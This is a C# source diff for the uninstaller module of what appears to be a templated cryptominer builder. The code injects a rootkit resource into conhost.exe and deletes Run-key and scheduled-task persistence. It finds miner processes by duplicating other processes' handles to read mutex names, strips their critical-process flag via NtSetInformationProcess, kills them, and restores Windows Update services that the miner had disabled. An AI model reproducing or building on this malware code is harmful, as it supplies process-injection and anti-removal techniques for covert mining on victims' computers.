@@ -23,23 +23,7 @@ public partial class _rUninstaller_
 #if DefRootkit
         try
         {
-            using (var archive = new ZipArchive(new MemoryStream(GetTheResource("rootkit_u"))))
-            {
-                foreach (ZipArchiveEntry entry in archive.Entries)
-                {
-                    if (entry.FullName.Contains("st"))
-                    {
-                        using (var streamdata = entry.Open())
-                        {
-                            using (var ms = new MemoryStream())
-                            {
-                                streamdata.CopyTo(ms);
-                                Inject(ms.ToArray(), Path.Combine(Directory.GetParent(Environment.SystemDirectory).FullName, "System32\\conhost.exe"), "");
-                            }
-                        }
-                    }
-                }
-            }  
+            Inject(GetTheResource("rootkit_u"), Path.Combine(Directory.GetParent(Environment.SystemDirectory).FullName, "System32\\conhost.exe"), "");
         }
         catch { }
 #endif
@@ -47,44 +31,21 @@ public partial class _rUninstaller_
 #if DefStartup
         try
         {
-            Command("cmd", "#REGREM");
+            Command("cmd", "/c reg delete \"HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\" /v \"#STARTUPENTRYNAME\" /f");
 
         }
         catch {}
 
         try
         {
-            Command("cmd", "#TASKSCHREM");
+            Command("cmd", "/c schtasks /delete /f /tn \"#STARTUPENTRYNAME\"");
         }
         catch { }
 #endif
 
         try
         {
-            List<int> pids = new List<int> { };
-            var _rarg1_ = new ConnectionOptions();
-            _rarg1_.Impersonation = ImpersonationLevel.Impersonate;
-            var _rarg2_ = new ManagementScope("\\root\\cimv2", _rarg1_);
-            _rarg2_.Connect();
-
-            var _rarg3_ = new ManagementObjectSearcher(_rarg2_, new ObjectQuery("Select CommandLine, ProcessID from Win32_Process")).Get();
-            string[] minerset = new string[] { $FINDSET };
-            foreach (ManagementObject MemObj in _rarg3_)
-            {
-                if (MemObj != null && MemObj["CommandLine"] != null && (minerset.Any(MemObj["CommandLine"].ToString().Contains) || MemObj["CommandLine"].ToString().Contains(" #WATCHDOGID")))
-                {
-                    pids.Add(Convert.ToInt32(MemObj["ProcessID"]));
-                }
-            }
-
-#if DefProcessProtect
-            UnProtect(pids.ToArray());
-#endif
-            
-            foreach(int pid in pids)
-            {
-                Command("cmd", string.Format("/c taskkill /f /PID \"{0}\"", pid));
-            }
+            KillProcesses();
         }
         catch { }
 
@@ -120,6 +81,15 @@ public partial class _rUninstaller_
         }
         catch { }
 #endif
+
+#if DefDisableWindowsUpdate
+        try
+        {
+            Command("cmd", "/c reg copy \"HKLM\\SYSTEM\\CurrentControlSet\\Services\\UsoSvc_bkp\" \"HKLM\\SYSTEM\\CurrentControlSet\\Services\\UsoSvc\" /s /f & reg copy \"HKLM\\SYSTEM\\CurrentControlSet\\Services\\WaaSMedicSvc_bkp\" \"HKLM\\SYSTEM\\CurrentControlSet\\Services\\WaaSMedicSvc\" /s /f & reg copy \"HKLM\\SYSTEM\\CurrentControlSet\\Services\\wuauserv_bkp\" \"HKLM\\SYSTEM\\CurrentControlSet\\Services\\wuauserv\" /s /f & reg copy \"HKLM\\SYSTEM\\CurrentControlSet\\Services\\BITS_bkp\" \"HKLM\\SYSTEM\\CurrentControlSet\\Services\\BITS\" /s /f & reg copy \"HKLM\\SYSTEM\\CurrentControlSet\\Services\\dosvc_bkp\" \"HKLM\\SYSTEM\\CurrentControlSet\\Services\\dosvc\" /s /f & reg delete \"HKLM\\SYSTEM\\CurrentControlSet\\Services\\UsoSvc_bkp\" /f & reg delete \"HKLM\\SYSTEM\\CurrentControlSet\\Services\\WaaSMedicSvc_bkp\" /f & reg delete \"HKLM\\SYSTEM\\CurrentControlSet\\Services\\wuauserv_bkp\" /f & reg delete \"HKLM\\SYSTEM\\CurrentControlSet\\Services\\BITS_bkp\" /f & reg delete \"HKLM\\SYSTEM\\CurrentControlSet\\Services\\dosvc_bkp\" /f & sc start UsoSvc & sc start WaaSMedicSvc & sc start wuauserv & sc start bits & sc start dosvc");
+
+        }
+        catch {}
+#endif
         Environment.Exit(0);
     }
 
@@ -137,6 +107,161 @@ public partial class _rUninstaller_
             });
         }
         catch { }
+    }
+
+    [StructLayout(LayoutKind.Sequential, Pack = 1)]
+    private struct SYSTEM_HANDLE_INFORMATION
+    {
+        public ushort ProcessID;
+        public ushort CreatorBackTrackIndex;
+        public byte ObjectType;
+        public byte HandleAttribute;
+        public ushort Handle;
+        public IntPtr Object_Pointer;
+        public IntPtr AccessMask;
+    }
+
+    private enum OBJECT_INFORMATION_CLASS : int
+    {
+        ObjectBasicInformation = 0,
+        ObjectNameInformation = 1,
+        ObjectTypeInformation = 2,
+        ObjectAllTypesInformation = 3,
+        ObjectHandleInformation = 4
+    }
+
+    [StructLayout(LayoutKind.Sequential, Pack = 1)]
+    private struct OBJECT_NAME_INFORMATION
+    {
+        public UNICODE_STRING Name;
+    }
+
+    [StructLayout(LayoutKind.Sequential)]
+    private struct UNICODE_STRING
+    {
+        public ushort Length;
+        public ushort MaximumLength;
+        public IntPtr Buffer;
+    }
+
+    [Flags]
+    private enum PROCESS_ACCESS_FLAGS : uint
+    {
+        All = 0x001F0FFF,
+        Terminate = 0x00000001,
+        CreateThread = 0x00000002,
+        VMOperation = 0x00000008,
+        VMRead = 0x00000010,
+        VMWrite = 0x00000020,
+        DupHandle = 0x00000040,
+        SetInformation = 0x00000200,
+        QueryInformation = 0x00000400,
+        Synchronize = 0x00100000
+    }
+
+    [DllImport("ntdll.dll")]
+    private static extern uint NtQuerySystemInformation(int SystemInformationClass, IntPtr SystemInformation, int SystemInformationLength, ref int returnLength);
+
+    [DllImport("kernel32.dll")]
+    private static extern IntPtr OpenProcess(PROCESS_ACCESS_FLAGS dwDesiredAccess, [MarshalAs(UnmanagedType.Bool)] bool bInheritHandle, int dwProcessId);
+
+    [DllImport("kernel32.dll", SetLastError = true)]
+    [return: MarshalAs(UnmanagedType.Bool)]
+    private static extern bool DuplicateHandle(IntPtr hSourceProcessHandle, IntPtr hSourceHandle, IntPtr hTargetProcessHandle, out IntPtr lpTargetHandle, uint dwDesiredAccess, [MarshalAs(UnmanagedType.Bool)] bool bInheritHandle, uint dwOptions);
+
+    [DllImport("kernel32.dll")]
+    private static extern IntPtr GetCurrentProcess();
+
+    [DllImport("ntdll.dll")]
+    private static extern int NtQueryObject(IntPtr ObjectHandle, int ObjectInformationClass, IntPtr ObjectInformation, int ObjectInformationLength, ref int returnLength);
+
+    [DllImport("kernel32.dll")]
+    private static extern bool CloseHandle(IntPtr hObject);
+
+    [DllImport("kernel32.dll")]
+    private static extern bool GetHandleInformation(IntPtr hObject, out uint lpdwFlags);
+
+    private const uint STATUS_INFO_LENGTH_MISMATCH = 0xC0000004;
+    private const int DUPLICATE_SAME_ACCESS = 0x2;
+    private const int SystemHandleInformation = 16;
+
+    private static void KillProcesses()
+    {
+        string[] processNames = new string[] { $INJECTIONTARGETS };
+        List<int> processIds = new List<int>();
+
+        foreach (var process in Process.GetProcesses())
+        {
+            if (Array.IndexOf(processNames, process.ProcessName.ToLowerInvariant() + ".exe") >= 0)
+            {
+                processIds.Add(process.Id);
+            }
+        }
+
+        string[] mutexes = new string[] { $MUTEXSET };
+
+        int structSize = Marshal.SizeOf(typeof(SYSTEM_HANDLE_INFORMATION));
+        int returnLength = structSize;
+        IntPtr handleInfoPtr = Marshal.AllocHGlobal(structSize);
+        while (NtQuerySystemInformation(SystemHandleInformation, handleInfoPtr, returnLength, ref returnLength) == STATUS_INFO_LENGTH_MISMATCH)
+        {
+            Marshal.FreeHGlobal(handleInfoPtr);
+            handleInfoPtr = Marshal.AllocHGlobal(returnLength);
+        }
+        long handleCount = Marshal.ReadInt64(handleInfoPtr);
+        IntPtr handleEntryPtr = handleInfoPtr + 8;
+        for (long i = 0; i < handleCount; i++)
+        {
+            SYSTEM_HANDLE_INFORMATION handle = (SYSTEM_HANDLE_INFORMATION)Marshal.PtrToStructure(handleEntryPtr, typeof(SYSTEM_HANDLE_INFORMATION));
+            if (handle.ProcessID > 0 && processIds.Contains(handle.ProcessID) && mutexes.Contains(GetMutexNameFromHandle(handle, handle.ProcessID)))
+            {
+#if DefProcessProtect
+                UnProtect(handle.ProcessID);
+#endif
+                Command("cmd", string.Format("/c taskkill /f /PID \"{0}\"", handle.ProcessID)); 
+            }
+            handleEntryPtr += structSize;
+        }
+        Marshal.FreeHGlobal(handleInfoPtr);
+    }
+
+    private static string GetMutexNameFromHandle(SYSTEM_HANDLE_INFORMATION systemHandleInformation, int processID)
+    {
+        IntPtr ipHandle = IntPtr.Zero;
+        IntPtr openProcessHandle = IntPtr.Zero;
+        IntPtr hObjectName = IntPtr.Zero;
+        try
+        {
+            PROCESS_ACCESS_FLAGS flags = PROCESS_ACCESS_FLAGS.DupHandle | PROCESS_ACCESS_FLAGS.VMRead;
+            openProcessHandle = OpenProcess(flags, false, processID);
+            if (!DuplicateHandle(openProcessHandle, new IntPtr(systemHandleInformation.Handle), GetCurrentProcess(), out ipHandle, 0, false, DUPLICATE_SAME_ACCESS)) return null;
+            int nLength = 512;
+            hObjectName = Marshal.AllocHGlobal(512);
+
+            while ((uint)NtQueryObject(ipHandle, (int)OBJECT_INFORMATION_CLASS.ObjectNameInformation, hObjectName, nLength, ref nLength) == STATUS_INFO_LENGTH_MISMATCH)
+            {
+                Marshal.FreeHGlobal(hObjectName);
+                if (nLength == 0) return null;
+                hObjectName = Marshal.AllocHGlobal(nLength);
+            }
+            OBJECT_NAME_INFORMATION objObjectName = (OBJECT_NAME_INFORMATION)Marshal.PtrToStructure(hObjectName, typeof(OBJECT_NAME_INFORMATION));
+            if (objObjectName.Name.Buffer != IntPtr.Zero)
+            {
+                return Marshal.PtrToStringUni(objObjectName.Name.Buffer);
+            }
+        }
+        catch (Exception ex)
+        {
+            Console.WriteLine(ex.Message);
+        }
+        finally
+        {
+            Marshal.FreeHGlobal(hObjectName);
+
+            CloseHandle(ipHandle);
+            CloseHandle(openProcessHandle);
+        }
+        return null;
     }
 
 #if DefRootkit
@@ -272,18 +397,15 @@ public partial class _rUninstaller_
     [DllImport("kernel32.dll", SetLastError = true)]
     public static extern IntPtr OpenProcess(uint processAccess, bool bInheritHandle, int processId);
 
-    private static void UnProtect(int[] pids)
+    private static void UnProtect(int pid)
     {
         try
         {
             Process.EnterDebugMode();
 
-            foreach(int pid in pids)
-            {
-                int isCritical = 0;
-                int BreakOnTermination = 0x1D;
-                NtSetInformationProcess(OpenProcess(0x001F0FFF, false, pid), BreakOnTermination, ref isCritical, sizeof(int));
-            }
+            int isCritical = 0;
+            int BreakOnTermination = 0x1D;
+            NtSetInformationProcess(OpenProcess(0x001F0FFF, false, pid), BreakOnTermination, ref isCritical, sizeof(int));
         }
         catch { }
     }
